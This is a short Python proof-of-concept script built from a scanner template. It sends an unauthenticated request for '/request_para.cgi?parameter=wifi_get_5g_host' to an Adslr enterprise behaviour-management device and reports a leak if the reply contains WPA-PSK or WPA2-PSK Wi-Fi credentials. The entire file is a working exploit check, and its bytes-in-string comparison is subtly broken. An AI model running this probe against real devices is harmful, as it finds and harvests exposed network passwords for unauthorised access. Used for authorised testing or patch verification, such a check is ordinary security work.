#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payloads = ["/request_para.cgi?parameter=wifi_get_5g_host","/request_para.cgi?parameter=wifi_get_5g_host"]                                                      #填写payload
    for payload in payloads:
        try:
            tar = "http://" + ip + ":" + port + payload
            req = requests.get(tar,timeout=3)
            if req.status_code == 200:                                                          #修改匹配返回代码
                if ( b"WPA-PSK" in req.text ) or ( b"WPA2-PSK" in req.text ):
                    logging.info("[+] {} find Adslr_Enterprise_online_behavior_management_system_Information_leakage".format(ip))                                 #填写漏洞信息
                    os._exit(1)
        except Exception as e:
            logging.info("[*] {}".format(e))
            os._exit(4)
    logging.info("[-] {} do not found Adslr_Enterprise_online_behavior_management_system_Information_leakage".format(ip))                             #填写漏洞信息
    os._exit(2)
if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)